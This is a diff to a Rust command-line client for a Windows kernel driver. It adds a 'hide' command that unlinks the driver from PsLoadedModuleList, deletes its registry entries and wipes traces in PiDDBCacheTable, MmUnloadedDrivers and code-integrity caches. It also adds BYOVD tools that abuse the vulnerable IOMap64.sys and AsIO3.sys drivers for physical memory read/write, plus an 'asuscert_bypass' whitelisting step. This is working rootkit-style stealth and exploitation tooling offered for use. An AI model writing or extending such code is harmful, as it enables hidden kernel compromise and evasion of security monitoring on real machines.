@@ -1,6 +1,10 @@
 //! User-mode IOCTL client for `win_hv` (ping / read / write via hypercalls).
 
+mod asio3;
+mod iomap64;
+
 use std::ffi::{OsStr, c_void};
+use std::io::{self, Write};
 use std::mem::size_of;
 use std::os::windows::ffi::OsStrExt;
 
@@ -9,9 +13,9 @@ use clap::{Parser, Subcommand};
 use shared_contract::{
     ClearTraceRequest, ClearTraceResponse, EptHook2Request, EptHook2Response, EptUnhookRequest,
     GetCr3ByPidRequest, GetCr3ByPidResponse, GetSsdtFunctionRequest, GetSsdtFunctionResponse,
-    GetSsdtResponse, CLEAR_TRACE_DRIVER_NAME_MAX, IOCTL_CLEAR_TRACE, IOCTL_EPT_HOOK2,
-    IOCTL_EPT_UNHOOK, IOCTL_GET_CR3_BY_PID, IOCTL_GET_SSDT, IOCTL_GET_SSDT_FUNCTION, IOCTL_PING,
-    IOCTL_QUERY_TRACE, IOCTL_READ_GVA, IOCTL_READ_MEMORY, IOCTL_SSDT_HOOK_GET_INFO,
+    GetSsdtResponse, HideRequest, HideResponse, CLEAR_TRACE_DRIVER_NAME_MAX, HIDE_FLAG_ALL,
+    HIDE_SERVICE_NAME_MAX, IOCTL_CLEAR_TRACE, IOCTL_EPT_HOOK2, IOCTL_EPT_UNHOOK, IOCTL_GET_CR3_BY_PID,
+    IOCTL_GET_SSDT, IOCTL_GET_SSDT_FUNCTION, IOCTL_HIDE, IOCTL_PING, IOCTL_QUERY_TRACE, IOCTL_READ_GVA, IOCTL_READ_MEMORY, IOCTL_SSDT_HOOK_GET_INFO,
     IOCTL_SSDT_HOOK_INSTALL, IOCTL_SSDT_HOOK_SET_BLOCK_PID, IOCTL_SSDT_HOOK_UNINSTALL,
     IOCTL_TRANSLATE_GVA, IOCTL_WRITE_MEMORY, IOCTL_WRITE_PHYSICAL, MEM_IO_MAX_LEN, MemIoRequest,
     PhysMemIoRequest, PING_RESPONSE_U32, QueryTraceRequest, QueryTraceResponse, ReadGvaRequest,
@@ -159,11 +163,44 @@ enum Commands {
         #[arg(long, default_value = "0")]
         stamp: String,
     },
+    /// Apply driver stealth (module unlink, registry, traces; optional symlink via `--flags`).
+    Hide {
+        /// SCM service name (e.g. `hv`).
+        #[arg(long, default_value = "win_hv")]
+        service: String,
+        /// Driver file name for trace cleanup (e.g. `win_hv.sys`).
+        #[arg(long, default_value = "win_hv.sys")]
+        driver: String,
+        /// PiDDB timestamp (hex). Use `0` to search PiDDB by name only.
+        #[arg(long, default_value = "0")]
+        stamp: String,
+        /// Stage flags hex mask (default: module + registry + traces; add `2` for symlink).
+        #[arg(long, default_value = "0")]
+        flags: String,
+    },
     /// Control the `ssdt_hook` example driver (`\\.\SsdtHook`).
     SsdtHook {
         #[command(subcommand)]
         action: SsdtHookAction,
     },
+    /// IOMap64.sys BYOVD tool — map/read/write physical memory via `\\.\IOMap`.
+    Iomap64 {
+        #[arg(long, short = 'd')]
+        device: Option<String>,
+
+        #[command(subcommand)]
+        action: iomap64::Iomap64Action,
+    },
+    /// AsIO3.sys BYOVD tool — phys mem read/write via `\\.\Asusgio3`.
+    Asio3 {
+        #[arg(long, short = 'd')]
+        device: Option<String>,
+
+        #[command(subcommand)]
+        action: asio3::AsIO3Action,
+    },
+    /// Interactive shell — keeps one AsIO3 device handle open for all `asio3` commands.
+    Shell,
 }
 
 #[derive(Subcommand)]
@@ -199,9 +236,17 @@ fn parse_address(input: &str) -> anyhow::Result<u64> {
 
 fn main() -> anyhow::Result<()> {
     let cli = Cli::parse();
-    println!("contract version: {}", shared_contract::CONTRACT_VERSION);
+    if !matches!(cli.command, Commands::Shell) {
+        println!("contract version: {}", shared_contract::CONTRACT_VERSION);
+    }
+    run_command(cli)
+}
 
+fn run_command(cli: Cli) -> anyhow::Result<()> {
     match cli.command {
+        Commands::Shell => run_interactive_shell(cli.device),
+        Commands::Asio3 { device, action } => asio3::run_asio3(device.as_deref(), action),
+        Commands::Iomap64 { device, action } => iomap64::run_iomap64(device.as_deref(), action),
         Commands::SsdtHook { action } => {
             println!("opening: {SSDT_HOOK_USER_DEVICE_PATH}");
             let handle = open_device(SSDT_HOOK_USER_DEVICE_PATH)?;
@@ -229,6 +274,107 @@ fn main() -> anyhow::Result<()> {
     }
 }
 
+fn print_shell_help() {
+    println!("interactive shell — one AsIO3 device handle for the whole session");
+    println!();
+    println!("  pid                         show this process PID");
+    println!("  help                        this message");
+    println!("  exit | quit                 leave shell (closes AsIO3 handle)");
+    println!();
+    println!("  whitelist once before first asio3 command:");
+    println!("    asuscert_bypass register --pid <pid>");
+    println!();
+    println!("win_hv examples:");
+    println!("  ping");
+    println!("  read 0xfffff80000000000 -s 32");
+    println!("  cr3 1234");
+    println!();
+    println!("asio3 examples:");
+    println!("  asio3 open");
+    println!("  asio3 alloc-contig --size 4096");
+    println!("  asio3 phys-map 0x70c79000 --size 4096");
+    println!("  asio3 read 0xf8000000 -s 64");
+    println!("  asio3 dump 0xe0000 -s 256");
+    println!();
+    println!("iomap64 examples:");
+    println!("  iomap64 info");
+    println!("  iomap64 dump 0xe0000 -s 256");
+}
+
+fn run_interactive_shell(default_device: Option<String>) -> anyhow::Result<()> {
+    let pid = std::process::id();
+    println!("win_hv_client shell");
+    println!("pid: {pid}");
+    println!("contract version: {}", shared_contract::CONTRACT_VERSION);
+    println!("whitelist once:  asuscert_bypass register --pid {pid}");
+    println!("AsIO3 handle stays open until exit — run multiple asio3 commands without re-register");
+    println!("type `help` or `exit`");
+    println!();
+
+    let mut asio3_session = asio3::AsIO3Session::new(asio3::ASIO3_DEVICE_PATH);
+
+    let stdin = io::stdin();
+    loop {
+        print!("> ");
+        io::stdout().flush()?;
+        let mut line = String::new();
+        let n = stdin.read_line(&mut line)?;
+        if n == 0 {
+            break;
+        }
+        let line = line.trim();
+        if line.is_empty() {
+            continue;
+        }
+        match line {
+            "exit" | "quit" => break,
+            "help" | "?" => {
+                print_shell_help();
+                continue;
+            }
+            "pid" => {
+                println!("{pid}");
+                continue;
+            }
+            _ => {}
+        }
+
+        let mut argv = vec!["win_hv_client".to_string()];
+        if let Some(ref device) = default_device {
+            argv.push("-d".to_string());
+            argv.push(device.clone());
+        }
+        argv.extend(line.split_whitespace().map(String::from));
+
+        match Cli::try_parse_from(&argv) {
+            Ok(parsed) => {
+                if matches!(parsed.command, Commands::Shell) {
+                    println!("already in shell");
+                    continue;
+                }
+                let result = match parsed.command {
+                    Commands::Asio3 { device, action } => {
+                        if let Some(d) = device {
+                            asio3_session.set_path(&d);
+                        }
+                        asio3_session.run(action)
+                    }
+                    command => run_command(Cli {
+                        device: parsed.device,
+                        command,
+                    }),
+                };
+                if let Err(e) = result {
+                    eprintln!("error: {e:#}");
+                }
+            }
+            Err(e) => eprintln!("{e}"),
+        }
+        println!();
+    }
+    Ok(())
+}
+
 fn dispatch_win_hv(h: &HANDLE, command: Commands) -> anyhow::Result<()> {
     match command {
         Commands::Ping => ping(h),
@@ -252,7 +398,16 @@ fn dispatch_win_hv(h: &HANDLE, command: Commands) -> anyhow::Result<()> {
         Commands::SsdtFn { name } => get_ssdt_function(h, &name),
         Commands::ClearTrace { name, stamp } => clear_trace(h, &name, &stamp),
         Commands::QueryTrace { name, stamp } => query_trace(h, &name, &stamp),
-        Commands::SsdtHook { .. } => unreachable!(),
+        Commands::Hide {
+            service,
+            driver,
+            stamp,
+            flags,
+        } => hide_driver(h, &service, &driver, &stamp, &flags),
+        Commands::SsdtHook { .. }
+        | Commands::Iomap64 { .. }
+        | Commands::Asio3 { .. }
+        | Commands::Shell => unreachable!(),
     }
 }
 
@@ -859,6 +1014,73 @@ fn query_trace(h: &HANDLE, name: &str, stamp: &str) -> anyhow::Result<()> {
     }
 
     print_trace_query(name, &response);
+    Ok(())
+}
+
+fn parse_hide_flags(input: &str) -> anyhow::Result<u32> {
+    if input == "0" {
+        return Ok(HIDE_FLAG_ALL);
+    }
+    let trimmed = input.trim();
+    let trimmed = trimmed.strip_prefix("0x").unwrap_or(trimmed);
+    u32::from_str_radix(trimmed, 16).with_context(|| format!("invalid hide flags: {input}"))
+}
+
+fn hide_driver(
+    h: &HANDLE,
+    service: &str,
+    driver: &str,
+    stamp: &str,
+    flags: &str,
+) -> anyhow::Result<()> {
+    if service.is_empty() || service.len() >= HIDE_SERVICE_NAME_MAX {
+        bail!("service name length must be 1..{HIDE_SERVICE_NAME_MAX}");
+    }
+    if driver.is_empty() || driver.len() >= CLEAR_TRACE_DRIVER_NAME_MAX {
+        bail!("driver name length must be 1..{CLEAR_TRACE_DRIVER_NAME_MAX}");
+    }
+
+    let stamp = parse_trace_stamp(stamp)?;
+    let flags = parse_hide_flags(flags)?;
+
+    let mut request = HideRequest {
+        stamp,
+        flags,
+        ..HideRequest::default()
+    };
+    request.service_name[..service.len()].copy_from_slice(service.as_bytes());
+    request.driver_name[..driver.len()].copy_from_slice(driver.as_bytes());
+
+    let mut response = HideResponse::default();
+    let mut returned = 0u32;
+    unsafe {
+        DeviceIoControl(
+            *h,
+            IOCTL_HIDE,
+            Some(std::ptr::from_ref(&request).cast::<c_void>()),
+            size_of::<HideRequest>() as u32,
+            Some(std::ptr::from_mut(&mut response).cast::<c_void>()),
+            size_of::<HideResponse>() as u32,
+            Some(std::ptr::from_mut(&mut returned)),
+            None,
+        )?;
+    }
+    if returned as usize != size_of::<HideResponse>() {
+        bail!("IOCTL_HIDE returned {returned} bytes");
+    }
+    if response.success == 0 {
+        bail!("hide failed: no requested stages succeeded");
+    }
+
+    println!("hide ok (service={service}, driver={driver}):");
+    println!("  PsLoadedModuleList:       {}", flag(response.ps_loaded_module));
+    println!("  device symlink:           {}", flag(response.device_symlink));
+    println!("  Services registry:        {}", flag(response.service_registry));
+    println!("  LEGACY Enum registry:     {}", flag(response.legacy_enum_registry));
+    println!("  PiDDBCacheTable:          {}", flag(response.piddb));
+    println!("  MmUnloadedDrivers:        {}", flag(response.unloaded));
+    println!("  g_KernelHashBucketList:   {}", flag(response.hash_bucket));
+    println!("  g_CiEaCacheLookasideList: {}", flag(response.ci_ea_cache));
     Ok(())
 }
 
